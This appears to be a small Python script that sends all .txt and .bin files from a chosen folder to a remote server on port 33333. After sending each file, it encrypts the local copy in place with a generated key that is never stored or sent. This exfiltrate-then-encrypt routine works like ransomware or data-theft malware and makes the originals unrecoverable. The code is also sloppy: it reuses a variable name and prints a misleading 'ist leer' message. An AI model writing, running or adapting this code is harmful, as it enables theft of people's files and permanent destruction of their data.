import socket
import os
from python_encryptor import encrypt, key_generate
import sys
from time import sleep

CHUNKSIZE = 1_000_000

while True:
    
    host_ip = str(input("[+] Please type in the ip-address of the server, you want to send the data: "))
    
    path = input("[+] Please type in the full path to your folder you want to send\nSyntax: C:/folder/.../file\n")
    
    if path == None:
        print("[!] Something went wrong. Please check your syntax!")
        print("[!] Program stopped!")
        exit(1)

    files = os.listdir(path)
    txt_files = [file for file in files if file.endswith(".bin") or file.endswith(".txt")]
    
    key = key_generate()
    
    for file in txt_files:
        sock = socket.socket()
        sock.connect((host_ip, 33333))
        file_path = path + "/" + file
        sock.sendall(file.encode())
        sleep(3)
        
        file = open(file_path, "rb")
        data = file.read(1024)
        while data:
            sock.send(data)
            data = file.read(1024)
            
        print("[i] {} ist leer".format(file))
        sleep(3)
        sock.close()
        
        file_data = open(file_path, "rb")
        data = file_data.read()
        file_data.close()
        encrypt(data, file_path, key)
